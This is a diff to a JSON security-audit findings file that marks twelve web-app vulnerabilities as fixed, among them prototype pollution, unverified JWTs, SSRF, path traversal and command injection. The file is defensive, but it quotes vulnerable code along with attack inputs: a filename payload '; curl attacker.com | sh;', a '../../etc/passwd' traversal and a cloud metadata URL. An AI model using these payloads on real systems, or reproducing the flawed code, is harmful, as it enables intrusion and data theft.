@@ -25,7 +25,8 @@
       "title": "Prototype pollution in deepMerge \u2014 no __proto__/constructor guard",
       "evidence": "for (const key of Object.keys(source)) {",
       "explanation": "deepMerge iterates all keys of the untrusted source object and recursively assigns them to target with no guard for __proto__, constructor, or prototype. An attacker who controls the preferences body can pollute Object.prototype, injecting arbitrary properties onto every object in the process.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F01.diff"
     },
     {
       "id": "F02",
@@ -37,7 +38,8 @@
       "title": "Password-reset token generated with Math.random()",
       "evidence": "  return Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);",
       "explanation": "Math.random() is not cryptographically secure and its output is predictable. An attacker who observes any Math.random output from the same process can predict reset tokens and take over accounts.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F02.diff"
     },
     {
       "id": "F03",
@@ -49,7 +51,8 @@
       "title": "requireAdmin decodes JWT without signature verification",
       "evidence": "  const claims = jwt.decode(header.replace('Bearer ', ''));",
       "explanation": "jwt.decode() skips signature verification entirely, so any self-crafted token with role:'admin' grants access to the admin reporting endpoint. An attacker needs only to base64-encode a forged payload.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F03.diff"
     },
     {
       "id": "F04",
@@ -61,7 +64,8 @@
       "title": "Internal API key compared with === (timing side-channel)",
       "evidence": "  if (req.headers['x-internal-key'] === config.internalApiKey) return next();",
       "explanation": "String === leaks how many leading bytes match via response-time differences. An attacker making many timed requests can recover the internalApiKey character by character.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F04.diff"
     },
     {
       "id": "F05",
@@ -73,7 +77,8 @@
       "title": "ReDoS via nested quantifiers in EMAIL_RE applied to user input",
       "evidence": "const EMAIL_RE = /^([a-zA-Z0-9._-]+)+@[a-zA-Z0-9-]+\\.[a-zA-Z]{2,}$/;",
       "explanation": "The pattern ([a-zA-Z0-9._-]+)+ has nested + quantifiers; testing a long non-matching local-part (e.g. 'aaaaaaaaa!') causes catastrophic backtracking. An unauthenticated attacker can hang the event loop with a single POST to /password-reset.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F05.diff"
     },
     {
       "id": "F06",
@@ -85,7 +90,8 @@
       "title": "Mass assignment of req.body onto user record allows role escalation",
       "evidence": "    Object.assign(user, req.body);",
       "explanation": "The entire request body is merged onto the user object before it is written back to the database, including the role column. Any authenticated user can escalate to role:'admin' with a single PATCH /me request.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F06.diff"
     },
     {
       "id": "F07",
@@ -97,7 +103,8 @@
       "title": "Unvalidated open redirect in /login/callback via next query param",
       "evidence": "  const next = String(req.query.next ?? '/');\n  return res.redirect(next);",
       "explanation": "The /login/callback endpoint redirects to the next query parameter without any origin or path restriction. An attacker can craft a phishing link that sends victims to an arbitrary external site after authentication.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F07.diff"
     },
     {
       "id": "F08",
@@ -109,7 +116,8 @@
       "title": "Path traversal in /files/download/:name \u2014 no basename or containment check",
       "evidence": "  const filePath = path.join(config.uploadDir, req.params.name);",
       "explanation": "req.params.name is joined directly to the upload directory with no basename() stripping or resolved-prefix containment check. An authenticated attacker can request ../../etc/passwd to read arbitrary files on the server.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F08.diff"
     },
     {
       "id": "F09",
@@ -121,7 +129,8 @@
       "title": "SSRF in /webhooks/test \u2014 user-supplied URL fetched without allow-list",
       "evidence": "    const response = await fetch(target, { method: 'POST', body: JSON.stringify({ ping: true }) });",
       "explanation": "The URL comes from req.body.url with no allow-list or scheme restriction. An authenticated attacker can make the server probe internal services (e.g. http://169.254.169.254/latest/meta-data/) or arbitrary external endpoints.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F09.diff"
     },
     {
       "id": "F10",
@@ -133,7 +142,8 @@
       "title": "IDOR in GET /invoices/:id \u2014 no owner_id check",
       "evidence": "    const [invoice] = await query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);",
       "explanation": "The query fetches any invoice by ID without verifying that it belongs to the requesting user. Any authenticated user can enumerate all invoices by iterating IDs, leaking all customer names and amounts.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F10.diff"
     },
     {
       "id": "F11",
@@ -145,7 +155,8 @@
       "title": "Request body (including passwords and tokens) written to server logs",
       "evidence": "  console.log(JSON.stringify({ id: req.id, method: req.method, path: req.path, body: req.body }));",
       "explanation": "Every request body is logged verbatim, including POST /password-reset (email) and PATCH /me (potentially new password). Anyone with log access can harvest credentials submitted by users.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F11.diff"
     },
     {
       "id": "F12",
@@ -157,7 +168,8 @@
       "title": "Command injection in makeThumbnail via user-controlled fileName",
       "evidence": "    exec(`convert \"${src}\" -resize 200x200 \"${src}.thumb.png\"`, (err) => (err ? reject(err) : resolve()));",
       "explanation": "fileName originates from req.params.name and is embedded in a shell command string without sanitization. An attacker can inject shell metacharacters (e.g. a filename containing \"; curl attacker.com | sh;\") to execute arbitrary commands on the server.",
-      "status": "open"
+      "status": "fixed",
+      "fix_diff": "audit/hard/fixes/F12.diff"
     }
   ]
 }
